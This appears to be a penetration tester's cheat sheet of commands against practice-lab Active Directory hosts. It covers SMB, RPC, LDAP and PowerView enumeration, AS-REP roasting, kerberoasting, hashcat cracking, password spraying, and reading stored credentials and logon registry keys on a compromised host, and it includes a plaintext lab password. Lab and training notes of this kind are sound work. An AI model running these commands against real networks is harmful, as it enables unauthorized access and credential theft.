```bash
# nmap
nmap 10.10.10.175 --script=smb-enum* -p445


# smbclient
## anon
smbclient -L 10.10.10.175 -N
smbclient -L 10.10.10.175 -U "Egotistical-bank.local/fsmith"
> recurse on
> prompt off
> ls


#smbmap
smbmap -H 10.10.10.161
smbmap -H 10.10.10.10 -u '' -p ''
smbmap -H 10.10.10.10 -u 'guest' -p ''


# enum4linux
enum4linux -a -u "" -p "" dc-ip
enum4linux -a -u "guest" -p "" dc-ip


# rpcclient
## anon
rpcclient 10.10.10.175 -N
rpcclient -U "" -N 10.10.10.161
> enumdomusers
> enumdomgroups


# GetNPUsers.py
## anon
GetNPUsers.py Egotistical-bank.local/ -dc-ip 10.10.10.175
GetNPUsers.py active.htb/ -dc-ip 10.10.10.100

## with username
GetNPUsers.py Egotistical-bank.local/fsmith -dc-ip 10.10.10.175 -request -no-pass

## with username list
GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175

## hashcat
hashcat -m 18200 ./hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt

# LDAP
## anon
ldapsearch -x -H ldap://10.10.10.175 -b "dc=Egotistical-bank,dc=local"


# PowerView
```bash
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn
Get-NetGroup "Sales Department" | select member

Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
Find-LocalAdminAccess
Get-NetSession -ComputerName files04 -Verbose
Get-NetSession -ComputerName web04 -Verbose
Get-NetSession -ComputerName client74
Get-NetUser -SPN | select samaccountname,serviceprincipalname(same as setspn -L iis_service)
Get-ObjectAcl -Identity stephanie
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
Find-DomainShare

```

# PsLoggedon.exe
```bash
.\PsLoggedon.exe \\files04

```


# kerbrute
## anon
kerbrute.py -users ./users.txt -dc-ip 10.10.10.175 -domain Egotistical-bank.local


#crackmapexec(smb/winrm)
crackmapexec smb 10.10.10.175 -u "" -p "" -d Egotistical-bank.local
crackmapexec smb 10.10.10.175 -u "fsmith" -p "" -d Egotistical-bank.local
crackmapexec smb 10.10.10.175 -u "fsmith" -p "Thestrokes23" -d Egotistical-bank.local
crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -d Egotistical-bank.local
```


# On Victim
```bash
whoami /priv
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"

net user /domain
net user fsmith /domain
net group /domain
net group "Sales Department" /domain



cmdkey /list
cat (Get-PSReadlineOption).HistorySavePath
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"


# kerberoast
.\Rubeus.exe kerberoast


```

